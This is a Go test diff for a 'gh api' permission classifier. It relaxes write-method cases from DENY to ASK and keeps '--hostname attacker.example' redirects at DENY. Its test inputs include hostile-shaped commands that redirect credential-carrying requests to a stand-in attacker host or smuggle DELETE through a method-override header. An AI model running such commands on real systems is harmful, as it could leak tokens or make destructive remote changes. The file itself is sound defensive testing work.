@@ -10,7 +10,11 @@ import (
 // DENY, every REST GET → ASK — walled off the entire issues plugin. This suite
 // pins the new behavior: query-only graphql documents ALLOW, mutation documents
 // ASK (naming the field), unclassifiable graphql DENYs; allow-listed REST GETs
-// ALLOW while the write DENY tiers stay intact.
+// ALLOW. Per #162, the REST/graphql write tiers (non-GET method, implicit-POST
+// body flag, method-override header) ASK rather than DENY — a `gh api` REST
+// write is a credential-carrying remote mutation the microVM cannot roll back,
+// the same class as an `aws` mutation (#124); --hostname keeps its own DENY
+// (the one shape the egress proxy's host-allowlist can see and control).
 
 // --- Design A: graphql document classification -------------------------------
 
@@ -134,11 +138,11 @@ func TestGhAPIGraphQLDuplicateQueryFieldDenies_113(t *testing.T) {
 	}
 }
 
-// The graphql write DENY tiers still fire regardless of the document: an
-// explicit non-GET method or the method-override header on the graphql endpoint
-// denies before document classification.
+// The graphql write tiers still fire regardless of the document: an explicit
+// non-GET method ASKs (#162) and --hostname still DENYs, both before document
+// classification.
 func TestGhAPIGraphQLWriteTiersUnchanged_113(t *testing.T) {
-	wantBucket(t, classifyCmd(t, `gh api -X DELETE graphql -f query='query { viewer { login } }'`, false), BucketDeny, "graphql -X DELETE")
+	wantBucket(t, classifyCmd(t, `gh api -X DELETE graphql -f query='query { viewer { login } }'`, false), BucketAsk, "graphql -X DELETE")
 	wantBucket(t, classifyCmd(t, `gh api graphql -f query='query { viewer { login } }' --hostname attacker.example`, false), BucketDeny, "graphql --hostname")
 }
 
@@ -196,7 +200,8 @@ func TestGhAPIRESTDeny_113(t *testing.T) {
 	}
 }
 
-// The existing REST write DENY tiers are unchanged by #113.
+// The REST write tiers ASK (#162; DENY under #113 for all but --hostname,
+// which keeps its own DENY justification — see rules.go classifyGhAPI).
 func TestGhAPIRESTWriteTiersUnchanged_113(t *testing.T) {
 	for _, cmd := range []string{
 		// implicit-POST via body flag (no explicit GET) on an allow-listed endpoint.
@@ -207,11 +212,12 @@ func TestGhAPIRESTWriteTiersUnchanged_113(t *testing.T) {
 		"gh api --method=POST repos/o/r",
 		// method-override header.
 		"gh api repos/o/r -H X-HTTP-Method-Override:DELETE",
-		// hostname redirect.
-		"gh api --hostname attacker.example repos/o/r",
 	} {
-		wantBucket(t, classifyCmd(t, cmd, false), BucketDeny, "REST write tier: "+cmd)
+		wantBucket(t, classifyCmd(t, cmd, false), BucketAsk, "REST write tier: "+cmd)
 	}
+	// hostname redirect stays DENY (own justification, not the write/read
+	// asymmetry — see classifyGhAPI).
+	wantBucket(t, classifyCmd(t, "gh api --hostname attacker.example repos/o/r", false), BucketDeny, "REST hostname redirect")
 	// -XGET -f … on an allow-listed endpoint stays a read → ALLOW (carve-out).
 	wantBucket(t, classifyCmd(t, "gh api -XGET repos/o/r -f a=b", false), BucketAllow, "-XGET -f allow-listed")
 }
